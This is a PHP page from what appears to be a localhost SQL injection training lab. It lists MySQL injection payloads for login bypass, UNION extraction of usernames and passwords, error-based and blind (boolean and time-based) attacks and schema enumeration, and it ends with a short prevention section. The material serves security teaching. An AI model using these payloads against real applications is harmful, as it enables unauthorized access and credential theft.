<?php
// ============================================================
// cheatsheet.php - SQL Injection Cheat Sheet / Reference Page
// SQL Injection Educational Lab
// FOR EDUCATIONAL PURPOSES ONLY - localhost only
// ============================================================

require_once 'lang_switcher.php';
?>
<!DOCTYPE html>
<html lang="<?= t('lang_code') ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= t('cheatsheet_page') ?></title>
    <style>
        <?= langSwitcherCSS() ?>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: #e0e0e0; min-height: 100vh; }
        .container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
        a.back { color: #00e5ff; text-decoration: none; font-size: 0.9rem; }
        a.back:hover { text-decoration: underline; }
        h1 { color: #00e5ff; margin: 16px 0 8px; font-size: 1.8rem; }
        .tag { display: inline-block; background: #0d47a1; color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; font-weight: bold; margin-bottom: 24px; }
        .section { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .section h2 { color: #00e5ff; font-size: 1.1rem; margin-bottom: 12px; border-bottom: 1px solid #2a2a4a; padding-bottom: 8px; }
        .section h3 { color: #ffab40; font-size: 0.95rem; margin: 14px 0 8px; }
        .section p { font-size: 0.88rem; color: #aaa; line-height: 1.6; margin-bottom: 8px; }
        .section code { display: block; background: #0d0d1a; padding: 8px 12px; border-radius: 4px; font-size: 0.82rem; color: #ff8a80; margin: 6px 0; word-break: break-all; }
        .section code.inline { display: inline; margin: 0; padding: 2px 6px; }
        table { width: 100%; border-collapse: collapse; margin: 8px 0; }
        th, td { text-align: left; padding: 8px 12px; border-bottom: 1px solid #2a2a4a; font-size: 0.85rem; }
        th { color: #888; background: #0d0d1a; }
        td code { color: #ff8a80; background: #0d0d1a; padding: 2px 6px; border-radius: 3px; }
        .danger { color: #ff5252; }
        .safe { color: #69f0ae; }
        .warn { color: #ffab40; }
        .prevention-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 12px; }
        .prevention-card { background: #0d0d1a; border-radius: 6px; padding: 14px; border-left: 3px solid #69f0ae; }
        .prevention-card h4 { color: #69f0ae; font-size: 0.9rem; margin-bottom: 6px; }
        .prevention-card p { font-size: 0.82rem; margin: 0; }
        @media (max-width: 600px) { .prevention-grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<?= langSwitcherHTML() ?>
<div class="container">
    <a class="back" href="index.php"><?= t('back_to_menu') ?></a>
    <h1><?= t('cheatsheet_title') ?></h1>
    <span class="tag"><?= t('cheatsheet_tag') ?></span>

    <!-- 1. Authentication Bypass -->
    <div class="section">
        <h2>1. <?= t('cs_auth_bypass') ?></h2>
        <p><?= t('cs_auth_bypass_desc') ?></p>
        <table>
            <tr><th><?= t('payload') ?></th><th><?= t('cs_description') ?></th></tr>
            <tr><td><code>admin' --</code></td><td><?= t('cs_auth_1') ?></td></tr>
            <tr><td><code>admin' #</code></td><td><?= t('cs_auth_2') ?></td></tr>
            <tr><td><code>' OR '1'='1' --</code></td><td><?= t('cs_auth_3') ?></td></tr>
            <tr><td><code>' OR 1=1 --</code></td><td><?= t('cs_auth_4') ?></td></tr>
            <tr><td><code>admin'/*</code></td><td><?= t('cs_auth_5') ?></td></tr>
            <tr><td><code>' OR ''='</code></td><td><?= t('cs_auth_6') ?></td></tr>
        </table>
    </div>

    <!-- 2. UNION Based -->
    <div class="section">
        <h2>2. <?= t('cs_union') ?></h2>
        <p><?= t('cs_union_desc') ?></p>
        <h3><?= t('cs_union_step1') ?></h3>
        <code>' ORDER BY 1 --</code>
        <code>' ORDER BY 2 --</code>
        <code>' ORDER BY 5 --  &larr; <?= t('cs_union_error_at') ?> 5 = 4 <?= t('cs_union_columns') ?></code>
        <h3><?= t('cs_union_step2') ?></h3>
        <code>' UNION SELECT 1,2,3,4 --</code>
        <h3><?= t('cs_union_step3') ?></h3>
        <code>' UNION SELECT 1, username, password, 4 FROM users --</code>
        <code>' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema=database() --</code>
    </div>

    <!-- 3. Error Based -->
    <div class="section">
        <h2>3. <?= t('cs_error') ?></h2>
        <p><?= t('cs_error_desc') ?></p>
        <table>
            <tr><th><?= t('cs_function') ?></th><th><?= t('payload') ?></th></tr>
            <tr><td>EXTRACTVALUE</td><td><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --</code></td></tr>
            <tr><td>UPDATEXML</td><td><code>' AND UPDATEXML(1, CONCAT(0x7e, version()), 1) --</code></td></tr>
            <tr><td>DOUBLE</td><td><code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --</code></td></tr>
        </table>
    </div>

    <!-- 4. Blind SQL Injection -->
    <div class="section">
        <h2>4. <?= t('cs_blind') ?></h2>
        <p><?= t('cs_blind_desc') ?></p>
        <h3><?= t('cs_blind_boolean') ?></h3>
        <code>admin' AND SUBSTRING(password,1,1)='a' --</code>
        <code>admin' AND ASCII(SUBSTRING(password,1,1))=97 --</code>
        <code>admin' AND LENGTH(password)=8 --</code>
        <h3><?= t('cs_blind_time') ?></h3>
        <code>admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0) --</code>
        <code>' OR IF(1=1, SLEEP(3), 0) --</code>
        <code>admin' AND BENCHMARK(5000000, MD5('test')) --</code>
    </div>

    <!-- 5. Data Exfiltration -->
    <div class="section">
        <h2>5. <?= t('cs_exfil') ?></h2>
        <table>
            <tr><th><?= t('cs_goal') ?></th><th><?= t('payload') ?></th></tr>
            <tr><td><?= t('cs_exfil_version') ?></td><td><code>' UNION SELECT 1, version(), 3, 4 --</code></td></tr>
            <tr><td><?= t('cs_exfil_db') ?></td><td><code>' UNION SELECT 1, database(), 3, 4 --</code></td></tr>
            <tr><td><?= t('cs_exfil_user') ?></td><td><code>' UNION SELECT 1, user(), 3, 4 --</code></td></tr>
            <tr><td><?= t('cs_exfil_tables') ?></td><td><code>' UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database() --</code></td></tr>
            <tr><td><?= t('cs_exfil_columns') ?></td><td><code>' UNION SELECT 1, GROUP_CONCAT(column_name), 3, 4 FROM information_schema.columns WHERE table_name='users' --</code></td></tr>
            <tr><td><?= t('cs_exfil_all_data') ?></td><td><code>' UNION SELECT 1, GROUP_CONCAT(username,0x3a,password), 3, 4 FROM users --</code></td></tr>
        </table>
    </div>

    <!-- 6. MySQL Useful Functions -->
    <div class="section">
        <h2>6. <?= t('cs_functions') ?></h2>
        <table>
            <tr><th><?= t('cs_function') ?></th><th><?= t('cs_description') ?></th></tr>
            <tr><td><code>version()</code></td><td><?= t('cs_fn_version') ?></td></tr>
            <tr><td><code>database()</code></td><td><?= t('cs_fn_database') ?></td></tr>
            <tr><td><code>user()</code></td><td><?= t('cs_fn_user') ?></td></tr>
            <tr><td><code>@@datadir</code></td><td><?= t('cs_fn_datadir') ?></td></tr>
            <tr><td><code>CONCAT()</code></td><td><?= t('cs_fn_concat') ?></td></tr>
            <tr><td><code>GROUP_CONCAT()</code></td><td><?= t('cs_fn_groupconcat') ?></td></tr>
            <tr><td><code>SUBSTRING(str,pos,len)</code></td><td><?= t('cs_fn_substring') ?></td></tr>
            <tr><td><code>ASCII()</code></td><td><?= t('cs_fn_ascii') ?></td></tr>
            <tr><td><code>LENGTH()</code></td><td><?= t('cs_fn_length') ?></td></tr>
            <tr><td><code>SLEEP(n)</code></td><td><?= t('cs_fn_sleep') ?></td></tr>
            <tr><td><code>IF(cond, t, f)</code></td><td><?= t('cs_fn_if') ?></td></tr>
        </table>
    </div>

    <!-- 7. Comment Styles -->
    <div class="section">
        <h2>7. <?= t('cs_comments') ?></h2>
        <table>
            <tr><th><?= t('cs_syntax') ?></th><th><?= t('cs_description') ?></th></tr>
            <tr><td><code>--</code></td><td><?= t('cs_comment_dash') ?></td></tr>
            <tr><td><code>#</code></td><td><?= t('cs_comment_hash') ?></td></tr>
            <tr><td><code>/* ... */</code></td><td><?= t('cs_comment_block') ?></td></tr>
            <tr><td><code>/*!50000 ... */</code></td><td><?= t('cs_comment_version') ?></td></tr>
        </table>
    </div>

    <!-- 8. Prevention -->
    <div class="section">
        <h2>8. <?= t('cs_prevention') ?></h2>
        <p><?= t('cs_prevention_desc') ?></p>
        <div class="prevention-grid">
            <div class="prevention-card">
                <h4>1. <?= t('cs_prev_prepared') ?></h4>
                <p><?= t('cs_prev_prepared_desc') ?></p>
            </div>
            <div class="prevention-card">
                <h4>2. <?= t('cs_prev_validate') ?></h4>
                <p><?= t('cs_prev_validate_desc') ?></p>
            </div>
            <div class="prevention-card">
                <h4>3. <?= t('cs_prev_escape') ?></h4>
                <p><?= t('cs_prev_escape_desc') ?></p>
            </div>
            <div class="prevention-card">
                <h4>4. <?= t('cs_prev_least') ?></h4>
                <p><?= t('cs_prev_least_desc') ?></p>
            </div>
            <div class="prevention-card">
                <h4>5. <?= t('cs_prev_waf') ?></h4>
                <p><?= t('cs_prev_waf_desc') ?></p>
            </div>
            <div class="prevention-card">
                <h4>6. <?= t('cs_prev_errors') ?></h4>
                <p><?= t('cs_prev_errors_desc') ?></p>
            </div>
        </div>
    </div>

</div>
</body>
</html>
